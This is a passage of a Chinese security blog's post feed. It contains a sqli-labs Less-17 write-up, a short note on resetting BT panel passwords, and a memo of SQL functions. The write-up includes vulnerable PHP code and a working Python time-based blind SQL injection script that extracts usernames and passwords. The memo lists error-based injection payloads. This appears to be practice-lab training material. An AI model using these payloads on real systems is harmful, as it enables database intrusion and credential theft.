punctuation">(</span><span class="token string single-quoted-string">'result.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'User Name:'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'New Password:'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// connectivity </span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username= <span class="token interpolation"><span class="token variable">$uname</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//echo $row;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//echo '&lt;font color= "#0000ff">';</span><span class="token variable">$row1</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//echo 'Your Login name:'. $row1;</span><span class="token variable">$update</span><span class="token operator">=</span><span class="token string double-quoted-string">"UPDATE users SET password = '<span class="token interpolation"><span class="token variable">$passwd</span></span>' WHERE username='<span class="token interpolation"><span class="token variable">$row1</span></span>'"</span><span class="token punctuation">;</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$update</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span><span class="token comment">//echo " You password has been successfully updated " ;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag1.jpg"   />'</span><span class="token punctuation">;</span><span class="token comment">//echo 'Your Password:' .$row['password'];</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span>  <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="4.5" color="#FFFF00">'</span><span class="token punctuation">;</span><span class="token comment">//echo "Bug off you Silly Dumb hacker";</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap1.jpg"   />'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>python</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*."</span>url <span class="token operator">=</span> <span class="token string">"http://192.168.184.1:801/sqli/Less-17/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token comment">#1' where username='admin' and if(mid((select database()),1,1)= 's',sleep(3),1)#</span>        <span class="token comment">#1' where username='admin' and if(mid((select  database()),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span>        <span class="token comment">#1' where username='admin' and if(mid((select group_concat(table_name,'') from information_schema.tables where table_schema=database()),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span>        <span class="token comment">#1' where username='admin' and if(mid((select group_concat(column_name,'') from information_schema.columns where table_name='users' and table_schema=database()),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span>        <span class="token comment">#1' where username='admin' and if(substr((select * from (select GROUP_CONCAT(BINARY(username),',',BINARY(password)) from users) as temp),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span>        flag <span class="token operator">=</span> <span class="token string">"1' where username='admin' and if(substr((select * from (select GROUP_CONCAT(BINARY(username),',',BINARY(password)) from users) as temp),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"uname"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"passwd"</span><span class="token punctuation">:</span>flag<span class="token punctuation">,</span><span class="token string">"submit"</span><span class="token punctuation">:</span><span class="token string">"submit"</span><span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment">#print("&#123;&#125;".format(r.status_code))</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>åŠ ä¸Š<code>where username=&#39;admin&#39;</code>æ˜¯ä¸ºäº†å‡å°‘çˆ†ç ´æ—¶é—´ï¼Œå› ä¸ºåœ¨æ”¹<code>password</code>çš„æ—¶å€™å°±åªä¼šæ”¹<code>admin</code>çš„<code>password</code>äº†ï¼Œå¦‚æœä¸åŠ ä¸Šäº¦å¯ï¼Œä¸åŠ ä¸Šçš„è¯ä¼šå°†æ‰€æœ‰çš„<code>password</code>éƒ½æ”¹ä¸º<code>1</code>ï¼Œä½†ä¹Ÿè¾¾åˆ°äº†ç›®çš„ï¼Œåœ¨æœ€åçˆ†ç ´å­—æ®µçš„æ—¶å€™é‡‡ç”¨äº†ä¸€ä¸ªè™šè¡¨<code>temp</code>ï¼Œå› ä¸º<code>update</code>æ“ä½œå’Œ<code>select</code>æ“ä½œéƒ½ä½œç”¨äºä¸€å¼ è¡¨ï¼Œä¸”ä¼šæŠ¥é”™ï¼š<code>Table &#39;test&#39; is specified twice, both as a target for &#39;UPDATE&#39; and as a separate source for data</code>æ‰€ä»¥é‡‡ç”¨è™šè¡¨è¿›è¡Œç›²æ³¨ï¼Œä¸”ä½¿ç”¨äº†<code>BINARY</code>å‡½æ•°æ¥åŒºåˆ†è¡¨ä¸­å†…å®¹çš„å¤§å°å†™</p>]]></content>
      
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
            <tag> SQL </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°å½•ä¸€æ¬¡æœ‰æƒŠæ— é™©ï¼ï¼ï¼</title>
      <link href="posts/53c288d6/"/>
      <url>posts/53c288d6/</url>
      
        <content type="html"><![CDATA[<p>è«åå…¶å¦™çš„phpmyadminå°±è¿›ä¸å»äº†ï¼Œä¸€ç›´å¯†ç é”™è¯¯ï¼Œåœ¨bté‡Œé¢æ”¹å¯†ç ä¹Ÿè¿›ä¸å»ï¼Œæçš„åæ¥å·®ä¸€ç‚¹åˆ é™¤æ•°æ®åº“</p><p>è§£å†³æ–¹æ³•ï¼š</p><p>ä¿®æ”¹æ•°æ®åº“å¯†ç ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> /www/server/panel <span class="token operator">&amp;&amp;</span> python tools.pyc root xxx</code></pre><p>ä¿®æ”¹bté¢æ¿çš„å¯†ç ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> /www/server/panel <span class="token operator">&amp;&amp;</span> python tools.pyc panel xxx</code></pre><span id="more"></span><p>xxxå¤„å†™ä¿®æ”¹ä½ çš„æ•°æ®åº“å¯†ç æˆ–btå¯†ç </p><p>æ³¨æ„ï¼Œä¿®æ”¹å®Œå¯†ç åè®¿é—®wpåšå®¢ä¼šæ˜¾ç¤ºæ•°æ®åº“è¿æ¥é”™è¯¯ï¼Œè¿™æ—¶åœ¨wp-config.phpä¸­ä¿®æ”¹ä½ çš„MySQLæ•°æ®åº“å¯†ç å°±è¡Œå•¦ï¼</p><p>é™„ä¸Šå‚è€ƒåŸæ–‡<a href="https://www.xqblog.com/12973.html">é“¾æ¥</a></p><p>æ„Ÿè°¢ï¼</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%9C%89%E6%83%8A%E6%97%A0%E9%99%A9%EF%BC%81%EF%BC%81%EF%BC%81/55667523_p0_master1200.jpg" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> æ‚ä¸ƒæ‚å…« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç”Ÿæ´» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºSQLä¸­çš„ä¸€äº›å‡½æ•°ï¼ˆå¤‡å¿˜ï¼‰</title>
      <link href="posts/cf51e998/"/>
      <url>posts/cf51e998/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a><strong>SQL Server</strong></h1><h2 id="STUFF-character-expression-start-length-character-expression"><a href="#STUFF-character-expression-start-length-character-expression" class="headerlink" title="STUFF ( character_expression , start , length ,character_expression )"></a><strong>STUFF ( character_expression , start , length ,character_expression )</strong></h2><p>character_expressionï¼šä¸€ä¸ªå­—ç¬¦æ•°æ®è¡¨è¾¾å¼ï¼Œå¯ä»¥æ˜¯å¸¸é‡ï¼Œå˜é‡ï¼Œä¹Ÿå¯ä»¥æ˜¯å­—ç¬¦åˆ—æˆ–äºŒçº§åˆ¶æ•°æ®åˆ—</p><p>startï¼šä¸€ä¸ªé‡æ•´æ•°å€¼ï¼ŒæŒ‡å®šè¦åˆ é™¤å’Œæ’å…¥çš„å¼€å§‹ä½ç½®ï¼Œå¦‚æœstartæˆ–lengthä¸ºè´Ÿï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚å¦‚æœstartæ¯”ç¬¬ä¸€ä¸ªcharacter_expressioné•¿ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚startå¯ä»¥æ˜¯big intå‹ã€‚</p><p>lengthï¼šä¸€ä¸ªæ•´æ•°ï¼ŒæŒ‡å®šè¦åˆ é™¤çš„å­—ç¬¦ä¸²ã€‚å¦‚æœlengthæ¯”ç¬¬ä¸€ä¸ªcharacter_expressioné•¿ï¼Œåˆ™æœ€å¤šåˆ é™¤åˆ°æœ€åä¸€ä¸ªcharacter_expressionä¸­çš„æœ€åä¸€ä¸ªå­—ç¬¦ã€‚lengthå¯ä»¥æ˜¯big intç±»å‹ã€‚</p><p>è¿”å›ç±»å‹ï¼šå¦‚æœcharacter_expressionæ˜¯å—æ”¯æŒçš„å­—ç¬¦æ•°æ®ç±»å‹ï¼Œåˆ™è¿”å›å­—ç¬¦æ•°æ®ã€‚å¦‚æœcharacter_expressionæ˜¯ä¸€ä¸ªå—æ”¯æŒçš„binaryæ•°æ®ç±»å‹ï¼Œåˆ™è¿”å›äºŒè¿›åˆ¶æ•°æ®ã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>ä»¥ä¸‹ç¤ºä¾‹åœ¨ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸² abcdef ä¸­åˆ é™¤ä»ç¬¬ 2 ä¸ªä½ç½®ï¼ˆå­—ç¬¦ bï¼‰å¼€å§‹çš„ä¸‰ä¸ªå­—ç¬¦ï¼Œç„¶ååœ¨åˆ é™¤çš„èµ·å§‹ä½ç½®æ’å…¥ç¬¬äºŒä¸ªå­—ç¬¦ä¸²ï¼Œä»è€Œåˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> STUFF<span class="token punctuation">(</span><span class="token string">'abcdef'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'ijklmn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ç»“æœï¼šaijklmnef</code></pre><h2 id="FOR-XML-PATH-â€˜â€™"><a href="#FOR-XML-PATH-â€˜â€™" class="headerlink" title="FOR XML PATH(â€˜â€™)"></a><strong>FOR XML PATH(â€˜â€™)</strong></h2><p>é€šå¸¸ä¸stuffå‡½æ•°ç»“åˆèµ·æ¥ä½¿ç”¨ï¼Œ å°†æŸ¥è¯¢ç»“æœé›†ä»¥<a href="https://baike.baidu.com/item/%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/2885849?fromtitle=xml&fromid=86251&fr=aladdin">XML</a>å½¢å¼å±•ç°</p><p>ç°æœ‰è¡¨</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-107.png" alt loading="lazy"></p><p>æ‰§è¡Œ</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> stuff<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token string">','</span><span class="token operator">+</span>test_name<span class="token operator">+</span>test_pass <span class="token keyword">from</span> test <span class="token keyword">for</span> xml path<span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-108.png" alt loading="lazy"></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> stuff<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token string">','</span><span class="token operator">+</span>test_name<span class="token operator">+</span>test_pass <span class="token keyword">from</span> test <span class="token keyword">for</span> xml path<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-109.png" alt loading="lazy"></p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><strong>MySQL</strong></h1><h2 id="Concat-str1-str2-â€¦"><a href="#Concat-str1-str2-â€¦" class="headerlink" title="Concat( str1,str2,â€¦ )"></a><strong>Concat( str1,str2,â€¦ )</strong></h2><p>è¿”å›ç»“æœä¸ºè¿ç»­å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ã€‚å¦‚æœä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºNULLï¼Œåˆ™è¿”å›å€¼ä¸ºNULLã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-138.png" alt loading="lazy"></p><h2 id="Concat-ws-separator-str1-str2-â€¦"><a href="#Concat-ws-separator-str1-str2-â€¦" class="headerlink" title="Concat_ws(separator,str1,str2,â€¦)"></a><strong>Concat_ws(separator,str1,str2,â€¦)</strong></h2><p>concat_ws()ä»£è¡¨concat with separator ï¼Œæ˜¯concatçš„ç‰¹æ®Šå½¢å¼ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å…¶å®ƒå‚æ•°çš„åˆ†éš”ç¬¦ï¼Œå¦‚æœåˆ†éš”ç¬¦ä¸ºNULLï¼Œåˆ™ç»“æœä¸ºNULL</p><p>å‡½æ•°è¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-139.png" alt loading="lazy"></p><h2 id="Group-concat"><a href="#Group-concat" class="headerlink" title="Group_concat()"></a>Group_concat()</h2><p>group_concat([DISTINCT] è¦è¿æ¥çš„å­—æ®µ [Order BY ASC/DESC æ’åºå­—æ®µ] [Separator â€˜åˆ†éš”ç¬¦â€™])</p><p>å°†åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœã€‚</p><p>é€šè¿‡ä½¿ç”¨distinctå¯ä»¥æ’é™¤é‡å¤å€¼ï¼›å¦‚æœå¸Œæœ›å¯¹ç»“æœä¸­çš„å€¼è¿›è¡Œæ’åºï¼Œå¯ä»¥ä½¿ç”¨order byå­å¥ï¼›separatoræ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å€¼ï¼Œç¼ºçœä¸ºä¸€ä¸ªé€—å·ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200203144159549.png" alt loading="lazy"></p><h2 id="Updatexml-XML-document-XPath-string-new-value"><a href="#Updatexml-XML-document-XPath-string-new-value" class="headerlink" title="Updatexml (XML_document, XPath_string, new_value)"></a><strong>Updatexml (XML_document, XPath_string, new_value)</strong></h2><ul><li>XML_documentï¼šStringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°</li><li>XPath_stringï¼šXPathæ ¼å¼çš„å­—ç¬¦ä¸²</li><li>new_valueï¼šStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</li></ul><p>SQLæ³¨å…¥é€šå¸¸ç”¨äºæ˜¾é”™æ³¨å…¥ï¼›XPath_stringå‡ºå‚æ•°é”™è¯¯æŠ¥é”™ï¼Œå¾—åˆ°ä¿¡æ¯ï¼Œæ–¹æ³•ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">updatexml(1,concat(1,(SELECT database())),1);</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-141.png" alt loading="lazy"></p><h2 id="Extractvalue-XML-document-XPath-string"><a href="#Extractvalue-XML-document-XPath-string" class="headerlink" title="Extractvalue (XML_document, XPath_string)"></a><strong>Extractvalue (XML_document, XPath_string)</strong></h2><ul><li><p>XML_documentï¼šStringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°</p></li><li><p>XPath_stringï¼šXpathæ ¼å¼çš„å­—ç¬¦ä¸²</p><p>extractvalue(1,concat(1,database()));</p></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-142.png" alt loading="lazy"></p><h2 id="Left-ARG-LENGTH-ã€Right-ARG-LENGTH"><a href="#Left-ARG-LENGTH-ã€Right-ARG-LENGTH" class="headerlink" title="Left(ARG,LENGTH)ã€Right(ARG,LENGTH)"></a><strong>Left(ARG,LENGTH)ã€Right(ARG,LENGTH)</strong></h2><p>æ­¤å‡½æ•°è¿”å›ARGæœ€å·¦è¾¹ï¼Œå³è¾¹çš„LENGTHä¸ªå­—ç¬¦ä¸²ï¼ŒARGå¯æ˜¯charæˆ–binaryï¼Œstring</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-143.png" alt loading="lazy"></p><h2 id="Substr-stirng-strat-length"><a href="#Substr-stirng-strat-length" class="headerlink" title="Substr(stirng,strat,length)"></a><strong>Substr(stirng,strat,length)</strong></h2><ul><li>stringï¼šéœ€è¦æˆªå–çš„å­—ç¬¦ä¸²</li><li>startï¼šå¼€å§‹æˆªå–çš„ä½ç½®</li><li>lengthï¼šéœ€è¦æˆªå–å­—ç¬¦ä¸²çš„ä¸ªæ•°ï¼Œè‹¥æ— æ­¤é¡¹ï¼Œåˆ™ä»æˆªå–ä½ç½®ä¸€ç›´æˆªå–åˆ°æœ€å</li></ul><p>å¿…è¦çš„æ—¶å€™å¯ä»¥ä¸ç”¨é€—å·ç”¨<code>from</code>å’Œ<code>for</code>ä»£æ›¿ï¼Œ<code>substr(string from start for length)</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-152.png" alt loading="lazy"></p><h2 id="Ascii-str"><a href="#Ascii-str" class="headerlink" title="Ascii(str)"></a><strong>Ascii(str)</strong></h2><p>è¿”å›å­—ç¬¦ä¸²strçš„æœ€å·¦å­—ç¬¦çš„æ•°å€¼ã€‚è¿”å›0ï¼Œå¦‚æœsträ¸ºç©ºå­—ç¬¦ä¸²ã€‚è¿”å›NULLï¼Œå¦‚æœsträ¸ºNULLã€‚ ASCII()è¿”å›æ•°å€¼æ˜¯ä»0åˆ°255ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-166.png" alt loading="lazy"></p><h2 id="Pow-x-y"><a href="#Pow-x-y" class="headerlink" title="Pow(x,y)"></a>Pow(x,y)</h2><p>pow(x,y)è¡¨ç¤ºè®¡ç®—xçš„yæ¬¡æ–¹ï¼Œå½“è®¡ç®—å€¼è¿‡å¤§æ—¶ï¼Œä¼šå‘ç”ŸDOUBLEæº¢å‡ºï¼Œæ•°æ®åº“æŠ¥é”™</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200203151717577.png" alt loading="lazy"></p><h2 id="MID-column-name-start-length"><a href="#MID-column-name-start-length" class="headerlink" title="MID(column_name,start[,length])"></a>MID(column_name,start[,length])</h2><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200224203301659.png" alt loading="lazy"></p><p>å¿…è¦çš„æ—¶å€™å¯ä»¥ä¸ç”¨é€—å·ç”¨<code>from</code>å’Œ<code>for</code>ä»£æ›¿ï¼Œ<code>mid(string from start for length)</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200224204817021.png" alt loading="lazy"></p><h2 id="Like"><a href="#Like" class="headerlink" title="Like"></a>Like</h2><p>LIKE æ“ä½œç¬¦ç”¨äºåœ¨ WHERE å­å¥ä¸­æœç´¢åˆ—ä¸­çš„æŒ‡å®šæ¨¡å¼ã€‚</p><p>æ”¯æŒé€šé…ç¬¦åŒ¹é…ï¼Œlikeæœ‰ä¸¤ä¸ªæ¨¡å¼ï¼š<code>_</code>å’Œ<code>%</code></p><p><strong>_</strong>ï¼šè¡¨ç¤ºå•ä¸ªå­—ç¬¦ï¼Œ<strong>%</strong>ï¼šè¡¨ç¤º0ä¸ªæˆ–å¤šä¸ªä»»æ„å­—ç¬¦</p><p>ä¾‹å¦‚ï¼š<code>name,%,%e,n%,%a%,_ame,____,_%_</code>éƒ½åŒ¹é…<code>name</code>è¿™ä¸ªå­—ç¬¦</p><h2 id="Rlikeå’ŒRegexp"><a href="#Rlikeå’ŒRegexp" class="headerlink" title="Rlikeå’ŒRegexp"></a>Rlikeå’ŒRegexp</h2><p><code>rlike==regexp</code>  éƒ½æ˜¯æ­£åˆ™åŒ¹é…ï¼Œç‰¹æ®Šå­—ç¬¦éœ€è¦è¿›è¡Œé€‚å½“çš„åæ–œæ è½¬ä¹‰</p><h2 id="INSTR-C1-C2-I-J"><a href="#INSTR-C1-C2-I-J" class="headerlink" title="INSTR(C1,C2,I,J)"></a>INSTR(C1,C2,I,J)</h2><p><strong>C1</strong>ï¼šè¡¨ç¤ºè¢«æœç´¢çš„å­—ç¬¦ä¸²</p><p><strong>C2</strong>ï¼šå¸Œæœ›æœç´¢çš„å­—ç¬¦ä¸²</p><p><strong>I</strong>ï¼šæœç´¢çš„å¼€å§‹ä½ç½®ï¼Œé»˜è®¤ä¸º1</p><p><strong>J</strong>ï¼šå‡ºç°çš„ä½ç½®ï¼Œé»˜è®¤ä¸º1</p><p>è¿”å›å€¼ä¸ºåŒ¹é…å¼€å§‹çš„ä½ç½®ï¼Œsqlä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®ä¸º1</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503180526297.png" alt loading="lazy"></p><h2 id="IF-expr1-expr2-expr3"><a href="#IF-expr1-expr2-expr3" class="headerlink" 